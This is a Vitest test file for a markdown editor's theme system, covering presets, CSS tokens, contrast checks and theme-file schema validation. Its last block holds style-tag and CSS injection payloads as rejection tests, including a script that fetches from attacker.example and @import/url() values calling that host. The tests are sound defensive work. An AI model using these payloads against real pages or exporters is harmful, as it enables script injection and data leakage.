import { readdirSync, readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";

import {
  applyTheme,
  docTokens,
  markTokens,
  mermaidThemeVariables,
  viewTokens,
  type DocView,
} from "./apply";
import { MARK_SLOTS } from "./apply";
import { contrastRatio, toHex, toHexStrict } from "./color";
import { BUNDLED_FONTS } from "./fonts";
import { DEFAULT_PRESET_ID, PRESETS, findPreset, resolveTheme } from "./presets";
import { ThemeColorsSchema, ThemeFileSchema, ThemeSchema, type Theme } from "./schema";
import { HOUSE_THEMES } from "./shiki-house";

const house = findPreset("house")!;

describe("presets", () => {
  it("gives every preset a voice no other preset already has", () => {
    // The regression this guards is the state the theme gallery was in before:
    // fifteen presets, four typography sets, eleven of them identical. Nothing
    // was broken and every test passed — the themes were simply the same page in
    // different colours, which is not something a schema can notice.
    //
    // The face, the size and the measure are the three that have to be chosen
    // together, so they are what identity is measured on. Two presets may share
    // one or two of them; sharing all three means one of them has nothing to say.

    // The one deliberate exception. GitHub Dimmed is not a theme that resembles
    // GitHub — it is github.com with the contrast taken off, which is how GitHub
    // itself ships it. Giving the two different type would claim a difference
    // that is not there. Listed rather than skipped so adding a third lookalike
    // is a decision someone has to write down.
    const SAME_PRODUCT = new Set(["github-dimmed"]);

    const seen = new Map<string, string>();
    for (const preset of PRESETS) {
      const { bodyFont, baseSize, measure } = preset.light.typography;
      const voice = `${bodyFont} @ ${baseSize}px / ${measure}ch`;
      const owner = seen.get(voice);
      if (!SAME_PRODUCT.has(preset.id)) {
        expect(owner, `${preset.id} is set exactly like ${owner} — ${voice}`).toBeUndefined();
      }
      seen.set(voice, preset.id);
    }
  });

  it("keeps both halves of a preset the same page", () => {
    // Turning the lights off changes the palette. It does not change the measure,
    // move the quotation marks or restyle the tables.
    for (const preset of PRESETS) {
      expect(preset.dark.typography, preset.id).toEqual(preset.light.typography);
      expect(preset.dark.components, preset.id).toEqual(preset.light.components);
      expect(preset.dark.layout, preset.id).toEqual(preset.light.layout);
    }
  });

  it("names only bundled faces", () => {
    // `face()` throws at module load, so this cannot fail through a preset — it
    // is here for a custom or imported theme's sake, and to fail loudly if the
    // generated list and the manifest ever stop agreeing.
    const bundled = new Set(BUNDLED_FONTS.map((font) => font.value));
    for (const preset of PRESETS) {
      const { bodyFont, headingFont, monoFont } = preset.light.typography;
      for (const font of [bodyFont, headingFont, monoFont]) {
        expect(bundled.has(font), `${preset.id} names unbundled face "${font}"`).toBe(true);
      }
    }
  });

  it("every half of every preset satisfies the schema", () => {
    for (const preset of PRESETS) {
      for (const half of ["light", "dark"] as const) {
        const result = ThemeSchema.safeParse(preset[half]);
        expect(
          result.success,
          `${preset.id}.${half}: ${JSON.stringify(result.error?.issues)}`,
        ).toBe(true);
      }
    }
  });

  it("declares the appearance that matches the half it is filed under", () => {
    for (const preset of PRESETS) {
      expect(preset.light.appearance, preset.id).toBe("light");
      expect(preset.dark.appearance, preset.id).toBe("dark");
    }
  });

  it("gives every theme a unique id", () => {
    const ids = PRESETS.flatMap((p) => [p.light.id, p.dark.id]);
    expect(new Set(ids).size).toBe(ids.length);
  });

  it("ships the default preset", () => {
    expect(findPreset(DEFAULT_PRESET_ID)).toBeDefined();
  });

  it("names a Shiki theme that is either House's own or a bundled id", async () => {
    // A typo here would silently fall back to plain text at runtime, which looks
    // like "highlighting is broken" rather than "the theme id is wrong".
    //
    // Checked against Shiki's own manifest rather than a list kept by hand here.
    // The hand-kept version had to be extended every time a preset was added,
    // which made it a second place to get the id wrong — a list whose job is to
    // catch drift should not be a thing that drifts.
    // Dynamic, because AGENTS.md forbids a static Shiki import anywhere in the
    // source tree — it is what keeps the highlighter out of the entry chunk.
    const { bundledThemesInfo } = await import("shiki/themes");
    const bundled = new Set(bundledThemesInfo.map((entry) => entry.id));

    for (const preset of PRESETS) {
      for (const half of ["light", "dark"] as const) {
        const id = preset[half].code.shikiTheme;
        expect(
          bundled.has(id) || id in HOUSE_THEMES,
          `${preset.id}.${half} names unknown shiki theme "${id}"`,
        ).toBe(true);
      }
    }
  });

  it("writes no control characters into a token", () => {
    // A `list-style-type` of `"\2013\00a0\00a0"` was written as a CSS escape and
    // came out of the editing tool as literal NUL bytes, which rendered as "a0a0"
    // on the page. Nothing failed: not the typecheck, not the schema, not any
    // other test — a token is a string, and that string was a valid one.
    // eslint-disable-next-line no-control-regex
    const control = /[\u0000-\u001f\u007f]/;
    for (const preset of PRESETS) {
      for (const half of ["light", "dark"] as const) {
        for (const [key, value] of Object.entries(docTokens(preset[half]))) {
          expect(control.test(value), `${preset.id}.${half} ${key}: ${JSON.stringify(value)}`).toBe(
            false,
          );
        }
      }
    }
  });

  it("keeps every color non-empty, so no token can resolve to nothing", () => {
    for (const preset of PRESETS) {
      for (const half of ["light", "dark"] as const) {
        for (const [key, value] of Object.entries(docTokens(preset[half]))) {
          expect(value.trim(), `${preset.id}.${half} ${key}`).not.toBe("");
        }
      }
    }
  });
});

describe("resolveTheme", () => {
  it("returns the half matching the appearance", () => {
    expect(resolveTheme("house", "light").id).toBe(house.light.id);
    expect(resolveTheme("house", "dark").id).toBe(house.dark.id);
  });

  it("prefers a custom theme with the same id", () => {
    const custom: Theme = { ...house.light, id: "mine", name: "Mine" };
    expect(resolveTheme("mine", "light", [custom])).toBe(custom);
  });

  it("falls back to the default rather than throwing on an unknown id", () => {
    // A config naming a theme the user deleted must not leave a blank window.
    expect(resolveTheme("deleted-theme", "dark").id).toBe(house.dark.id);
  });
});

describe("docTokens", () => {
  it("emits only --doc-* properties", () => {
    for (const key of Object.keys(docTokens(house.light))) {
      expect(key.startsWith("--doc-"), key).toBe(true);
    }
  });

  it("derives heading sizes from the theme's own scale", () => {
    const tokens = docTokens(house.light);
    const sizes = [1, 2, 3, 4, 5, 6].map((n) => parseFloat(tokens[`--doc-h${n}`]!));

    // Monotonically decreasing, h1 clearly larger than body, h6 just under it.
    for (let i = 1; i < sizes.length; i++) {
      expect(sizes[i]!, `h${i + 1} vs h${i}`).toBeLessThan(sizes[i - 1]!);
    }
    expect(sizes[0]!).toBeGreaterThan(1.5);
    expect(sizes[5]!).toBeLessThan(1);
  });

  it("responds to the scale: a flat scale flattens the hierarchy", () => {
    const flat = docTokens({
      ...house.light,
      typography: { ...house.light.typography, scale: 1 },
    });
    expect(parseFloat(flat["--doc-h1"]!)).toBe(1);
    expect(parseFloat(flat["--doc-h6"]!)).toBe(1);
  });

  it("carries units so the values are usable as CSS", () => {
    const tokens = docTokens(house.light);
    expect(tokens["--doc-size"]).toMatch(/px$/);
    expect(tokens["--doc-measure"]).toMatch(/ch$/);
    expect(tokens["--doc-para-space"]).toMatch(/em$/);
    expect(tokens["--doc-tracking"]).toMatch(/em$/);
    // Unitless on purpose — line-height with a unit does not inherit correctly.
    expect(tokens["--doc-leading"]).not.toMatch(/[a-z]/);
  });

  it("maps justify onto a text-align value", () => {
    const typography = house.light.typography;
    expect(docTokens(house.light)["--doc-align"]).toBe("start");
    expect(
      docTokens({ ...house.light, typography: { ...typography, justify: true } })["--doc-align"],
    ).toBe("justify");
  });
});

describe("the page and the measure", () => {
  const view = (patch: Partial<DocView> = {}): DocView => ({
    zoom: 1,
    contentWidth: "standard",
    ...patch,
  });

  it("gives the page the measure at standard, and more at wide and full", () => {
    expect(viewTokens(view())["--doc-page"]).toBe("var(--doc-measure)");
    expect(viewTokens(view({ contentWidth: "wide" }))["--doc-page"]).toBe(
      "calc(var(--doc-measure) * 1.5)",
    );
    expect(viewTokens(view({ contentWidth: "full" }))["--doc-page"]).toBe("100%");
  });

  it("gives each setting its own width, so all three are distinguishable", () => {
    const widths = (["standard", "wide", "full"] as const).map(
      (contentWidth) => viewTokens(view({ contentWidth }))["--doc-page"],
    );
    expect(new Set(widths).size).toBe(widths.length);
  });

  it("keeps the view out of the theme's own tokens", () => {
    // A theme file must not be able to carry someone else's window width, for
    // the same reason it cannot carry their zoom.
    const tokens = docTokens(house.light);
    for (const property of Object.keys(viewTokens(view()))) {
      expect(tokens, property).not.toHaveProperty(property);
    }
  });
});

describe("structural tokens", () => {
  const withType = (patch: Partial<Theme["typography"]>) =>
    docTokens({
      ...house.light,
      typography: { ...house.light.typography, ...patch },
    });

  const withLayout = (patch: Partial<Theme["layout"]>) =>
    docTokens({ ...house.light, layout: { ...house.light.layout, ...patch } });

  it("lets an indent replace the blank line rather than adding to it", () => {
    const spaced = withType({ paragraphStyle: "spaced" });
    expect(spaced["--doc-indent"]).toBe("0em");
    expect(parseFloat(spaced["--doc-para-space"]!)).toBeGreaterThan(0);

    const indented = withType({ paragraphStyle: "indented" });
    expect(parseFloat(indented["--doc-indent"]!)).toBeGreaterThan(0);
    expect(parseFloat(indented["--doc-para-space"]!)).toBe(0);
  });

  it("maps the three link-underline settings onto rest and hover", () => {
    const at = (linkUnderline: Theme["typography"]["linkUnderline"]) => {
      const tokens = withType({ linkUnderline });
      return [tokens["--doc-link-underline"], tokens["--doc-link-underline-hover"]];
    };
    expect(at("always")).toEqual(["underline", "underline"]);
    expect(at("hover")).toEqual(["none", "underline"]);
    expect(at("never")).toEqual(["none", "none"]);
  });

  it("tightens table padding on the compact density", () => {
    const table = house.light.layout.table;
    const comfortable = withLayout({ table: { ...table, density: "comfortable" } });
    const compact = withLayout({ table: { ...table, density: "compact" } });

    expect(parseFloat(compact["--doc-table-pad-block"]!)).toBeLessThan(
      parseFloat(comfortable["--doc-table-pad-block"]!),
    );
    expect(parseFloat(compact["--doc-table-pad-inline"]!)).toBeLessThan(
      parseFloat(comfortable["--doc-table-pad-inline"]!),
    );
  });

  it("draws vertical rules only for a grid, and pads every cell that gets one", () => {
    const table = house.light.layout.table;
    const hairline = withLayout({ table: { ...table, rules: "hairline" } });
    expect(hairline["--doc-table-rule"]).toBe("transparent");
    // Flush to the text edge, which is what makes a hairline table read as part
    // of the page rather than as a box on it.
    expect(hairline["--doc-table-pad-edge"]).toBe("0px");
    expect(hairline["--doc-table-pad-start"]).toBe("0px");

    const grid = withLayout({ table: { ...table, rules: "grid" } });
    expect(grid["--doc-table-rule"]).not.toBe("transparent");
    expect(grid["--doc-table-pad-edge"]).not.toBe("0px");
    // The one this test used to miss. Only the outer two cells were padded, so
    // every column after the first sat hard against its own rule.
    expect(grid["--doc-table-pad-start"]).not.toBe("0px");
  });

  it("tints a quotation whichever style it is", () => {
    // A rule about quotations, not a property of one style: a quotation marked
    // only by being italic, or larger, or slightly outdented reads as an
    // emphatic paragraph. The styles differ in what joins the tint — a rule, a
    // radius, a displacement — never in whether there is one.
    for (const quote of ["bar", "card", "hang", "plain"] as const) {
      const tokens = docTokens({
        ...house.light,
        components: { ...house.light.components, quote },
      });
      expect(tokens["--doc-quote-fill"], quote).not.toBe("transparent");
      // A fill with the text against its edge is worse than no fill, so every
      // style has to pad on all four sides — a one- or two-value `inset` does.
      expect(tokens["--doc-quote-inset"]!.split(/\s+/).length, `${quote} inset`).toBeGreaterThan(1);
    }
  });

  it("resolves the stripe to transparent when it is off, never to nothing", () => {
    // An empty value would make the row inherit whatever came before it.
    const table = house.light.layout.table;
    expect(withLayout({ table: { ...table, zebra: false } })["--doc-table-stripe"]).toBe(
      "transparent",
    );
    expect(withLayout({ table: { ...table, zebra: true } })["--doc-table-stripe"]).not.toBe(
      "transparent",
    );
  });

  it("maps hyphenation and code wrapping onto their CSS values", () => {
    expect(withType({ hyphenate: true })["--doc-hyphens"]).toBe("auto");
    expect(withType({ hyphenate: false })["--doc-hyphens"]).toBe("manual");

    const wrapped = docTokens({
      ...house.light,
      code: { ...house.light.code, wrap: true },
    });
    expect(docTokens(house.light)["--doc-code-wrap"]).toBe("pre");
    expect(wrapped["--doc-code-wrap"]).toBe("pre-wrap");
  });
});

describe("applyTheme", () => {
  it("writes every token onto the target element", () => {
    const element = document.createElement("div");
    applyTheme(house.dark, element);

    for (const [property, value] of Object.entries(docTokens(house.dark))) {
      expect(element.style.getPropertyValue(property), property).toBe(value);
    }
  });

  it("records the appearance so the canvas can match native controls", () => {
    const element = document.createElement("div");
    applyTheme(house.dark, element);
    expect(element.dataset.appearance).toBe("dark");
    expect(element.style.colorScheme).toBe("dark");
  });

  it("replaces the previous theme's values rather than layering on them", () => {
    const element = document.createElement("div");
    applyTheme(house.dark, element);
    applyTheme(house.light, element);
    expect(element.style.getPropertyValue("--doc-bg")).toBe(house.light.colors.bg);
    expect(element.dataset.appearance).toBe("light");
  });

  it("scales the base size by the reader's zoom", () => {
    const element = document.createElement("div");
    applyTheme(house.light, element, { zoom: 1.5 });
    expect(element.style.getPropertyValue("--doc-size")).toBe(
      `${house.light.typography.baseSize * 1.5}px`,
    );
  });

  it("leaves zoom out of docTokens, so an export keeps the theme's own size", () => {
    // Zoom is a property of the reader's view, not of the theme. A document
    // exported while zoomed in must not carry that zoom into the file.
    const element = document.createElement("div");
    applyTheme(house.light, element, { zoom: 2 });

    expect(docTokens(house.light)["--doc-size"]).toBe(`${house.light.typography.baseSize}px`);
    expect(element.style.getPropertyValue("--doc-size")).not.toBe(
      docTokens(house.light)["--doc-size"],
    );
  });

  it("writes the reader's width onto the element without touching the theme", () => {
    const element = document.createElement("div");
    applyTheme(house.light, element, { contentWidth: "full" });
    expect(element.style.getPropertyValue("--doc-page")).toBe("100%");
    expect(house.light.typography.measure).toBe(66);
  });

  it("defaults to a standard-width page when no view is given", () => {
    const element = document.createElement("div");
    applyTheme(house.light, element);
    expect(element.style.getPropertyValue("--doc-page")).toBe("var(--doc-measure)");
  });

  it("records heading numbering, which counters cannot express as a token", () => {
    const element = document.createElement("div");
    applyTheme(house.light, element);
    expect(element.dataset.headingNumbers).toBe("false");

    applyTheme(
      { ...house.light, layout: { ...house.light.layout, numberHeadings: true } },
      element,
    );
    expect(element.dataset.headingNumbers).toBe("true");
  });

  it("never writes a --ui-* property", () => {
    // The rule that makes Studio Rail work: a theme cannot reach the chrome.
    const element = document.createElement("div");
    applyTheme(house.dark, element);
    for (let i = 0; i < element.style.length; i++) {
      expect(element.style.item(i).startsWith("--ui-")).toBe(false);
    }
  });
});

describe("mermaidThemeVariables", () => {
  it("draws its palette from the theme, so diagrams recolor with the page", () => {
    // Compared through `toHex` because Mermaid is handed hex, not the authored
    // colour — it cannot parse oklch. See lib/theme/color.ts.
    const vars = mermaidThemeVariables(house.dark);
    expect(vars.background).toBe(toHex(house.dark.colors.bg));
    expect(vars.textColor).toBe(toHex(house.dark.colors.text));
    expect(vars.lineColor).toBe(toHex(house.dark.colors.textMuted));
  });

  it("differs between the light and dark halves of the same preset", () => {
    expect(mermaidThemeVariables(house.light)).not.toEqual(mermaidThemeVariables(house.dark));
  });
});

describe("theme files", () => {
  it("round-trips a theme through the export format", () => {
    const file = { format: "lindo-md-theme", version: 1, theme: house.light };
    const parsed = ThemeFileSchema.parse(JSON.parse(JSON.stringify(file)));
    expect(parsed.theme).toEqual(house.light);
  });

  it("rejects a file that is not a lindo-md theme", () => {
    expect(ThemeFileSchema.safeParse({ theme: house.light }).success).toBe(false);
    expect(
      ThemeFileSchema.safeParse({
        format: "something-else",
        version: 1,
        theme: house.light,
      }).success,
    ).toBe(false);
  });

  it("rejects a theme with a color missing", () => {
    const broken = JSON.parse(JSON.stringify(house.light));
    delete broken.colors.link;
    expect(ThemeSchema.safeParse(broken).success).toBe(false);
  });

  it("imports a file exported before the structural settings existed", () => {
    // The promise the version field makes: a theme someone shared last year
    // still opens, with the new settings at their defaults.
    const old = JSON.parse(JSON.stringify(house.light));
    delete old.layout;
    delete old.code.wrap;
    delete old.typography.hyphenate;
    delete old.typography.paragraphStyle;
    delete old.typography.linkUnderline;

    const parsed = ThemeSchema.parse(old);
    expect(parsed.layout.table.rules).toBe("hairline");
    expect(parsed.layout.numberHeadings).toBe(false);
    expect(parsed.code.wrap).toBe(false);
    expect(parsed.typography.hyphenate).toBe(true);
    expect(parsed.typography.paragraphStyle).toBe("spaced");
    expect(parsed.typography.linkUnderline).toBe("always");
  });

  it("rejects typography outside the readable range", () => {
    const tooSmall = {
      ...house.light,
      typography: { ...house.light.typography, baseSize: 4 },
    };
    expect(ThemeSchema.safeParse(tooSmall).success).toBe(false);
  });
});

describe("the two token namespaces stay apart", () => {
  // DESIGN.md's structural rule, enforced rather than trusted: the chrome must
  // not read the paper's tokens, and the document stylesheet must not read the
  // tool's. Checked against the stylesheet source because that is where a
  // violation would actually be written.
  const css = readFileSync("src/styles.css", "utf8");

  it("defines both namespaces in styles.css", () => {
    expect(css).toContain("--ui-base:");
    expect(css).toContain("--doc-bg:");
  });

  it("keeps the paper out of the tool and the tool out of the paper", () => {
    // DESIGN.md says this rule is "enforced, not merely intended" and names a
    // file that does not exist. Nothing checked it, which is how a swatch reading
    // a `--doc-*` token got as far as review. Two directions, both cheap:
    //
    //  - the document stylesheet must never read a `--ui-*` token, or a paper
    //    theme would inherit whatever the chrome happens to be;
    //  - a component must never read a `--doc-*` token, or switching to a bright
    //    paper theme washes out the rail.
    //
    // `styles.css` is deliberately exempt on the first count: it *owns* the House
    // defaults, so defining one `--doc-*` in terms of another is its job.
    expect(readFileSync("src/document.css", "utf8")).not.toContain("var(--ui-");

    const components = readdirSync("src/components", { recursive: true, encoding: "utf8" })
      .filter((name) => name.endsWith(".tsx"))
      .map((name) => `src/components/${name.replaceAll("\\", "/")}`);
    expect(components.length).toBeGreaterThan(10);
    for (const file of components) {
      // Prose about the rule is not a breach of it; a `var()` reaching CSS is.
      expect(readFileSync(file, "utf8"), `${file} reads a --doc-* token`).not.toContain(
        "var(--doc-",
      );
    }
  });

  it("gives styles.css a House default for every token applyTheme writes", () => {
    // Otherwise a token would fall back to nothing before React mounts, and the
    // first paint would be subtly wrong in a way that is hard to spot.
    // markTokens is in here for the same reason the other two are: applyTheme
    // writes it. Leaving it out would let a highlight slot ship with no default,
    // and the failure is invisible — a mark that paints nothing looks like a
    // mark that was never saved.
    const written = {
      ...docTokens(house.light),
      ...viewTokens({ zoom: 1, contentWidth: "standard" }),
      ...markTokens(house.light),
    };
    for (const property of Object.keys(written)) {
      // Heading sizes are computed per theme, not defaulted in CSS.
      if (/^--doc-h\d$/.test(property)) continue;
      expect(css, `${property} has no default in styles.css`).toContain(`${property}:`);
    }
  });

  it("overrides rather than unions when a theme is nested inside a theme", () => {
    // `applyTheme` writes onto the canvas, not onto documentElement, so a themed
    // card inside a themed page has two themed ancestors. This was `data-*`
    // attributes first, and equal-specificity selectors resolve by source order
    // rather than by proximity — so the two variants' properties unioned and
    // every non-House theme drew its own furniture on top of House's.
    //
    // Custom properties inherit, so the nearest ancestor wins. What that needs is
    // for every theme to write every token: a variant that only sets the
    // properties it turns *on* leaves the outer theme's showing through.
    const keys = (theme: Theme) => Object.keys(docTokens(theme)).sort();
    for (const preset of PRESETS) {
      expect(keys(preset.light), `${preset.id} writes a different set to House`).toEqual(
        keys(house.light),
      );
    }
  });
});

/** A CSS colour as sRGB 0-255, via `toHex` so oklch is understood. */
function channels(value: string): number[] {
  const n = parseInt(toHex(value).slice(1), 16);
  return [(n >> 16) & 255, (n >> 8) & 255, n & 255];
}

describe("markTokens", () => {
  it("emits only --doc-* properties, like every other value on the paper", () => {
    for (const property of Object.keys(markTokens(house.light))) {
      expect(property.startsWith("--doc-"), property).toBe(true);
    }
  });

  it("covers every slot the menu offers, so no colour can paint as nothing", () => {
    const tokens = markTokens(house.light);
    for (const slot of MARK_SLOTS) {
      expect(tokens[`--doc-mark-${slot}`], slot).toBeTruthy();
      expect(tokens[`--doc-mark-ink-${slot}`], `${slot} ink`).toBeTruthy();
    }
  });

  it("takes the ground from the theme, so a theme can recolour a highlight", () => {
    const recoloured = {
      ...house.light,
      colors: { ...house.light.colors, mark: { ...house.light.colors.mark, yellow: "#123456" } },
    };
    expect(markTokens(recoloured)["--doc-mark-yellow"]).toBe("#123456");
  });

  it("keeps body text legible inside a mark, on every preset and every slot", () => {
    // The check that would have caught the first version of this palette: a
    // translucent wash over the page, which reads well on paper the colour of
    // paper and fails on dark themes — Solarized Dark went from 5.61:1 to
    // 2.44:1. An opaque ground with a derived ink makes this a property of
    // `markTokens` rather than of the paper, so it holds for all forty halves.
    for (const preset of PRESETS) {
      for (const half of ["light", "dark"] as const) {
        const tokens = markTokens(preset[half]);
        for (const slot of MARK_SLOTS) {
          expect(
            contrastRatio(tokens[`--doc-mark-${slot}`]!, tokens[`--doc-mark-ink-${slot}`]!),
            `${slot} on ${preset.id}.${half}`,
          ).toBeGreaterThanOrEqual(4.5);
        }
      }
    }
  });

  it("holds that guarantee for colours no preset uses, because a theme is a shared file", () => {
    // The reason the ink is derived rather than chosen. Nothing stops someone
    // putting any of these in a theme they send to a friend, and a fixed ink
    // would be a guess that happened to suit the palette that shipped.
    for (const hostile of [
      "#ffffff",
      "#000000",
      "#808080",
      "#7d7d7d",
      "#7f7f00",
      "oklch(0.5 0.2 300)",
    ]) {
      const theme = {
        ...house.light,
        colors: {
          ...house.light.colors,
          mark: { ...house.light.colors.mark, yellow: hostile },
        },
      };
      const tokens = markTokens(theme);
      expect(tokens["--doc-mark-yellow"], `${hostile} should be painted as given`).toBe(hostile);
      expect(
        contrastRatio(tokens["--doc-mark-yellow"]!, tokens["--doc-mark-ink-yellow"]!),
        hostile,
      ).toBeGreaterThanOrEqual(4.5);
    }
  });

  it("refuses a mark colour it cannot reason about, rather than deriving an ink from a guess", () => {
    // The defect this check exists for: `toHex` falls back to black for a form
    // it cannot parse, so `white` reported luminance 0, the *light* ink was
    // chosen, and the guarantee said 19.29:1 while the reader got about 1.02:1.
    // Worse, the contrast assertion above used the same function, so it agreed.
    // These are all legal under `isSafeCssValue`, and `var()`/`color-mix()` are
    // used by the presets themselves.
    for (const unreadable of [
      "white",
      "hsl(60 100% 50%)",
      "color-mix(in oklab, white 90%, black)",
      "var(--doc-bg)",
      "#ffff00ff",
      "rgba(255, 255, 0, 0.05)",
      "oklch(0.9 0.15 95 / 0.1)",
      "oklch(0.9 0.15 0.25turn)",
    ]) {
      expect(toHexStrict(unreadable), `${unreadable} must not parse`).toBeNull();

      const parsed = ThemeColorsSchema.safeParse({
        ...house.light.colors,
        mark: { ...house.light.colors.mark, yellow: unreadable },
      });
      expect(parsed.success, `${unreadable} should still yield a usable theme`).toBe(true);
      // Refused per slot and replaced by House's own, so one bad value costs the
      // reader that colour and not every other one they chose.
      const slot = parsed.success ? parsed.data.mark.yellow : "";
      expect(slot, `${unreadable} should fall back`).toBe("oklch(0.88 0.15 95)");
    }
  });

  it("still accepts the colour forms a theme legitimately uses for a mark", () => {
    for (const fine of [
      "#ffee00",
      "#fe0",
      "rgb(255, 238, 0)",
      "oklch(0.88 0.15 95)",
      "oklch(88% 0.15 95deg)",
    ]) {
      expect(toHexStrict(fine), `${fine} should parse`).not.toBeNull();
    }
  });

  it("keeps a mark visible against every preset's paper", () => {
    // A highlight the same colour as the page is not a highlight. Checked against
    // every half of every preset, because a palette that is only ever eyeballed on
    // House is a palette that has only been checked on one paper.
    for (const preset of PRESETS) {
      for (const half of ["light", "dark"] as const) {
        const paper = channels(preset[half].colors.bg);
        const tokens = markTokens(preset[half]);
        for (const slot of MARK_SLOTS) {
          const ground = channels(tokens[`--doc-mark-${slot}`]!);
          const distance = Math.hypot(...ground.map((c, i) => c - paper[i]!));
          expect(distance, `${slot} on ${preset.id}.${half}`).toBeGreaterThan(20);
        }
      }
    }
  });

  it("paints the ink as well as the ground, which is what the contrast check assumes", () => {
    // Without this the check above is theatre: `toHex` drops alpha, so a
    // translucent palette scores exactly the same against the ink as an opaque
    // one does. What makes the number true on the page is that the stylesheet
    // sets both halves of the pair — go back to a wash that lets the theme's own
    // text show through and the contrast becomes the paper's business again.
    const css = readFileSync("src/document.css", "utf8");
    for (const slot of MARK_SLOTS) {
      const at = css.indexOf(`::highlight(lindo-md-mark-${slot})`);
      expect(at, `no rule for ${slot}`).toBeGreaterThan(-1);
      const block = css.slice(at, css.indexOf("}", at));
      expect(block, `${slot} does not set its ink`).toContain(`color: var(--doc-mark-ink-${slot})`);
      expect(block, `${slot} does not set its ground`).toContain(
        `background-color: var(--doc-mark-${slot})`,
      );
    }
  });
});

describe("theme values as CSS", () => {
  /**
   * A theme is a file people share, so it is untrusted input. `applyTheme` is safe
   * on its own — `setProperty` goes through CSSOM — but the HTML exporter writes the
   * same tokens as *text* into a literal `<style>`, which is a raw-text element: the
   * tokenizer ends it at the first `</style`.
   */
  const hostile = "#fff</style><script>fetch('https://attacker.example')</script>";

  function withColor(value: string) {
    const base = structuredClone(house.light);
    base.colors.bg = value;
    return base;
  }

  it("refuses a colour that closes the style element", () => {
    const result = ThemeSchema.safeParse(withColor(hostile));
    expect(result.success).toBe(false);
  });

  it.each([
    ["a semicolon, ending the declaration", "#fff; background: red"],
    ["braces, closing the rule", "#fff} body { display: none"],
    ["an at-rule", "@import 'https://attacker.example/x.css'"],
    ["url(), which also fetches", "url(https://attacker.example/pixel.png)"],
    ["a comment, swallowing what follows", "#fff /* "],
  ])("refuses %s", (_label, value) => {
    expect(ThemeSchema.safeParse(withColor(value)).success).toBe(false);
  });

  it.each([
    ["oklch, how the presets are authored", "oklch(0.72 0.11 253)"],
    ["hex", "#a3b1c6"],
    ["rgb with commas", "rgb(163, 177, 198)"],
    ["a var() reference", "var(--doc-accent)"],
    ["a colour keyword", "rebeccapurple"],
  ])("still accepts %s", (_label, value) => {
    expect(ThemeSchema.safeParse(withColor(value)).success).toBe(true);
  });

  it("still accepts a real font stack, quotes and commas and all", () => {
    const theme = structuredClone(house.light);
    theme.typography.bodyFont = '"IBM Plex Sans", -apple-system, Segoe UI, sans-serif';
    expect(ThemeSchema.safeParse(theme).success).toBe(true);
  });

  it("refuses a font family that closes the style element", () => {
    const theme = structuredClone(house.light);
    theme.typography.bodyFont = hostile;
    expect(ThemeSchema.safeParse(theme).success).toBe(false);
  });

  it("rejects the hostile theme as a whole theme file, which is how it would arrive", () => {
    const file = { format: "lindo-md-theme", version: 1, theme: withColor(hostile) };
    expect(ThemeFileSchema.safeParse(file).success).toBe(false);
  });
});
